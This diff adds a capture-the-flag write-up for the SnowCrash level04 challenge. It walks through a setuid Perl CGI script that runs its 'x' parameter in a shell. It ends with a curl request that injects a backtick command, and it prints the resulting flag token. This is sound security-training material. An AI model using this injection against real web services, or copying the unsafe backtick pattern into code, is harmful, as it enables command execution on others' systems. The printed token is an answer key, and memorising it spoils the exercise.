@@ -1,0 +1,101 @@
+# Goal:
+
+find level04 flag
+flag can be obtained by running the getflag program as flag03 user
+
+# Reconnaissance
+
+```
+level04@SnowCrash:~$ ls -al
+total 16
+dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
+d--x--x--x  1 root    users    340 Aug 30  2015 ..
+-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
+-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
+-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
+-r-x------  1 level04 level04  675 Apr  3  2012 .profile
+level04@SnowCrash:~$ cat level04.pl
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+level04@SnowCrash:~$
+```
+
+level04 home directory contain an executable perl script belonging to flag04 user. It is setuid and setgid and will then run with flag04 privileges.
+
+## flag04.pl
+
+- flag04.pl seems to be a cgi script running on localhost, port 4747. It echo the request parameter named x.
+
+## port 4747
+
+```
+level04@SnowCrash:~$ netstat -lt
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 *:4242                  *:*                     LISTEN
+tcp        0      0 localhost:pcrd          *:*                     LISTEN
+tcp6       0      0 [::]:4646               [::]:*                  LISTEN
+tcp6       0      0 [::]:4747               [::]:*                  LISTEN
+tcp6       0      0 [::]:http               [::]:*                  LISTEN
+tcp6       0      0 [::]:4242               [::]:*                  LISTEN
+```
+
+A service is effectively listening on port 4747. Let ask it who it is:
+
+```
+level04@SnowCrash:~$ curl "localhost:4747/badway"
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /badway was not found on this server.</p>
+<hr>
+<address>Apache/2.2.22 (Ubuntu) Server at localhost Port 4747</address>
+</body></html>
+level04@SnowCrash:~$ curl "localhost:4747/whoareyou"
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /whoareyou was not found on this server.</p>
+<hr>
+<address>Apache/2.2.22 (Ubuntu) Server at localhost Port 4747</address>
+</body></html>
+```
+
+The service is Apache2.2.22
+
+```
+level04@SnowCrash:~$ ls /etc/apache2/sites-enabled/
+000-default  level05.conf  level12.conf
+level04@SnowCrash:~$ cat /etc/apache2/sites-enabled/level05.conf
+<VirtualHost *:4747>
+	DocumentRoot	/var/www/level04/
+	SuexecUserGroup flag04 level04
+	<Directory /var/www/level04>
+		Options +ExecCGI
+		DirectoryIndex level04.pl
+		AllowOverride None
+		Order allow,deny
+		Allow from all
+		AddHandler cgi-script .pl
+	</Directory>
+</VirtualHost>
+```
+
+# Exploitation
+
+As the parameter x is in a shell command executed as flag04, we can try a command injection to execute the getflag program:
+
+``level04@SnowCrash:~$ curl 'localhost:4747?x=`getflag`'
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap``
